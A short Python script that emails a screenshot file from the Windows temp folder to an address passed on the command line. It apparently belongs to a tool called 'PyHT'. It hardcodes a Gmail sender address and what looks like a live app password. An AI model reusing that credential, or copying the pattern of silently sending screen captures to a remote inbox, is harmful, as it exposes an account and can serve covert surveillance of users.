# -*- coding: utf-8 -*-


import smtplib,sys
import tempfile
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText  # Importación correcta de MIMEText
from email.mime.base import MIMEBase
from email import encoders


def send_email_with_image(subject, body, sender, recipients, password, image_path):
    msg = MIMEMultipart()
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = ', '.join(recipients)
    
    msg.attach(MIMEText(body, 'plain'))
    
    with open(image_path, "rb") as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={image_path}')
        msg.attach(part)
    
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
        smtp_server.login(sender, password)
        smtp_server.sendmail(sender, recipients, msg.as_string())

email_to_send=sys.argv[1]
email_body = f"Screenshot {datetime.now()}"
tmp_path = tempfile.gettempdir() + "\\screen.png"
send_email_with_image("PyHT Screenshot", email_body, "pyhtcontact@gmail.com", [email_to_send], "xazo pnkc dthk kojs", tmp_path)